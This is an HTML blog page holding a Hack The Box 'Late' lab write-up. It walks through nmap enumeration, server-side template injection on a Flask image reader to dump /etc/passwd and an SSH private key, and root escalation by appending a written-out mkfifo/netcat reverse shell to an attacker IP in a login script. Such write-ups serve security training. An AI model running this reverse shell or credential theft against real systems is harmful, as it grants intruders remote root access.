@@ -1,0 +1,994 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.0, mkdocs-material-8.5.6">
+    
+    
+      
+        <title>Late HTB Writeup - WOLF</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.20d9efc8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#8bc34b">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#late-htb-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="WOLF" class="md-header__button md-logo" aria-label="WOLF" data-md-component="logo">
+      
+  <img src="../../assets/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            WOLF
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Late HTB Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../Ctf/" class="md-tabs__link">
+      Writeups
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../Go/" class="md-tabs__link">
+      Go
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../Privesc/" class="md-tabs__link">
+      Privesc
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Programming/Assembly/Commandline/" class="md-tabs__link">
+        Programming
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../2022-01-22-knight-ctf/" class="md-tabs__link md-tabs__link--active">
+        Writeups
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="WOLF" class="md-nav__button md-logo" aria-label="WOLF" data-md-component="logo">
+      
+  <img src="../../assets/logo.jpg" alt="logo">
+
+    </a>
+    WOLF
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ctf/" class="md-nav__link">
+        Writeups
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Go/" class="md-nav__link">
+        Go
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Privesc/" class="md-nav__link">
+        Privesc
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Programming
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Programming" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Programming
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5_1" type="checkbox" id="__nav_5_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5_1">
+          Assembly
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Assembly" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_1">
+          <span class="md-nav__icon md-icon"></span>
+          Assembly
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Programming/Assembly/Commandline/" class="md-nav__link">
+        Commandline Arguments
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Writeups
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Writeups" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Writeups
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-01-22-knight-ctf/" class="md-nav__link">
+        KNIGHT CTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-02-26-mhsctf-2022/" class="md-nav__link">
+        MHSCTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-03-06-urchinsec-ctf/" class="md-nav__link">
+        Urchinsec 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-05-20-JWT/" class="md-nav__link">
+        JSON WEB TOKENS (JWT)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Late HTB Writeup
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Late HTB Writeup
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#late-htb-writeup" class="md-nav__link">
+    Late Htb Writeup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1enumeration" class="md-nav__link">
+    1.Enumeration
+  </a>
+  
+    <nav class="md-nav" aria-label="1.Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-80" class="md-nav__link">
+    port 80
+  </a>
+  
+    <nav class="md-nav" aria-label="port 80">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imageslatehtb" class="md-nav__link">
+    Images.late.htb
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-from-hacktricks" class="md-nav__link">
+    SSTI (From Hacktricks)
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (From Hacktricks)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detect" class="md-nav__link">
+    Detect
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-foothold" class="md-nav__link">
+    2 Foothold
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-privesc" class="md-nav__link">
+    3 Privesc
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-06-08-Pandora-Writeup/" class="md-nav__link">
+        Pandora HTB Writeup
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-07-23-Wgel-CTF/" class="md-nav__link">
+        THM Easy Box - Wgel CTF
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2022-07-23-basic-Pentesting/" class="md-nav__link">
+        2022 07 23 basic Pentesting
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#late-htb-writeup" class="md-nav__link">
+    Late Htb Writeup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1enumeration" class="md-nav__link">
+    1.Enumeration
+  </a>
+  
+    <nav class="md-nav" aria-label="1.Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-80" class="md-nav__link">
+    port 80
+  </a>
+  
+    <nav class="md-nav" aria-label="port 80">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imageslatehtb" class="md-nav__link">
+    Images.late.htb
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-from-hacktricks" class="md-nav__link">
+    SSTI (From Hacktricks)
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI (From Hacktricks)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detect" class="md-nav__link">
+    Detect
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-foothold" class="md-nav__link">
+    2 Foothold
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-privesc" class="md-nav__link">
+    3 Privesc
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h2 id="late-htb-writeup">Late Htb Writeup</h2>
+<p><img alt="late" src="https://user-images.githubusercontent.com/96860148/172097378-e0db8140-3297-481a-af43-f5d7f98e4773.png" /></p>
+<h2 id="1enumeration">1.Enumeration</h2>
+<!--more-->
+
+<p>nmap</p>
+<pre><code>┌──(wolf㉿piratesec)-[~/Htb/late]
+└─$ nmap --min-rate 10000 -p- 10.129.227.134 -oN nmap
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 03:58 EDT
+Warning: 10.129.227.134 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.227.134
+Host is up (0.19s latency).
+Not shown: 58789 closed tcp ports (conn-refused), 6744 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 41.48 seconds
+</code></pre>
+<p>The nmap scan did not give much results and port 80 will be our foothold.</p>
+<h3 id="port-80">port 80</h3>
+<p>Looking around in the web server I find a link to an online photo editor.</p>
+<p><img alt="editor" src="https://user-images.githubusercontent.com/96860148/172098611-ae7eddec-8fc3-42b2-a824-60baf33d2f6b.png" /></p>
+<p>Heading there I'm taken to <strong>images.late.htb</strong> . Time to add it to /etc/hosts</p>
+<pre><code>10.129.227.134  late.htb
+10.129.227.134  images.late.htb
+</code></pre>
+<h4 id="imageslatehtb">Images.late.htb</h4>
+<p><img alt="images late" src="https://user-images.githubusercontent.com/96860148/172099127-386d6e77-c092-45a0-b25c-4c31d4a3d745.png" /></p>
+<p>I uploaded this picture</p>
+<p><img alt="late" src="https://user-images.githubusercontent.com/96860148/172097378-e0db8140-3297-481a-af43-f5d7f98e4773.png" /></p>
+<p>and got back results,txt which had...</p>
+<p><img alt="results" src="https://user-images.githubusercontent.com/96860148/172099605-5b3f70a9-ad75-4df3-b436-4a3d9508bdc8.png" /></p>
+<p>This smelled of SSTI....</p>
+<h1 id="ssti-from-hacktricks"><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI (From Hacktricks)</a></h1>
+<p>A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.</p>
+<h2 id="detect">Detect</h2>
+<p>The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as the polyglot ${{&lt;%[%'"}}%.</p>
+<p>Detect - Plaintext context</p>
+<p>The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expression:</p>
+<p>So i'm going to use this image with mathematical operations to see if the site is vulnerable to SSTI...</p>
+<p><img alt="payload" src="https://user-images.githubusercontent.com/96860148/172100440-b2844de1-704e-45c9-b84b-76b0c93addfe.png" /></p>
+<p>Which gives back ...</p>
+<p><img alt="results1" src="https://user-images.githubusercontent.com/96860148/172100701-9b66cc81-abce-4422-b62c-c1558535d99d.png" /></p>
+<p>The site is vulnerable to SSTI..</p>
+<h2 id="2-foothold">2 Foothold</h2>
+<h2 id="exploitation">Exploitation</h2>
+<p>Since it's a flask application I'll try to read the contents of the /etc/passwd using this payload</p>
+<p><img alt="payload1" src="https://user-images.githubusercontent.com/96860148/172102020-3fb83062-2510-454e-8573-3afa50eb1ae6.png" /></p>
+<p>Which gives me</p>
+<pre><code>&lt;p&gt;o
+7 root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
+colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
+smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
+smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
+
+&lt;/p&gt;
+</code></pre>
+<p>Looking in the /etc/passwd file I can see there is a user called <strong>sc_acc</strong>. Remember port 22 was open from the nmap scan. I'll try to read svc_acc's ssh private key...</p>
+<p>The payload...</p>
+<p><img alt="1" src="https://user-images.githubusercontent.com/96860148/172102374-39d23e05-45f4-476d-994f-31d899a29ef6.png" /></p>
+<p>And voila...the private key..</p>
+<p><img alt="key" src="https://user-images.githubusercontent.com/96860148/172102500-0f158cb9-efd1-4df5-aecb-45260137c4ac.png" /></p>
+<p>I give the key necessary permissions <strong>chmod +600 rsa</strong> and use it to login to ssh and read the user flag.</p>
+<p><img alt="ssh" src="https://user-images.githubusercontent.com/96860148/172103225-76eaadfe-986b-42b3-936e-66fb05f4303b.png" /></p>
+<h2 id="3-privesc">3 Privesc</h2>
+<p>Enter linpeas</p>
+<p>I'm going to start a python server on my local machine to transfer linpeas to the compromised machine and try to look for ways to escalate priviledges..</p>
+<p><img alt="python" src="https://user-images.githubusercontent.com/96860148/172104066-efd5cdf1-01da-4363-9b2f-63cb82f1d06e.png" /></p>
+<p>Then use curl to get the file</p>
+<p><img alt="curl" src="https://i.imgur.com/NzEHzqz.png" /></p>
+<p>Looking at the output of linpeas and using this guide..</p>
+<p><img alt="help" src="https://i.imgur.com/0TRtKpB.png" /></p>
+<p>I find this interesting file..</p>
+<p><img alt="file" src="https://i.imgur.com/Zh6Z9Qx.png" /></p>
+<p>Rading the contents of the file, the script runs every time a user logins or exits in. I'll append a reverse shell to the script to see if I'll get something</p>
+<pre><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.47 1234 &gt;/tmp/f&quot; &gt;&gt; ssh-alert.sh
+</code></pre>
+<p>Along the way I got some minor issues and reset the machine to get it as good as new.</p>
+<p>I start a netcat listener on my local machine and when I exit from my ssh session, I get a reverse shell..as ROOT !!</p>
+<p><img alt="rev" src="https://i.imgur.com/m2FfaMN.png" /></p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../2022-05-20-JWT/" class="md-footer__link md-footer__link--prev" aria-label="Previous: JSON WEB TOKENS (JWT)" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              JSON WEB TOKENS (JWT)
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../2022-06-08-Pandora-Writeup/" class="md-footer__link md-footer__link--next" aria-label="Next: Pandora HTB Writeup" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Pandora HTB Writeup
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2022 Calvin Kimani
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.5bf1dace.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.078830c0.min.js"></script>
+      
+    
+  </body>
+</html>
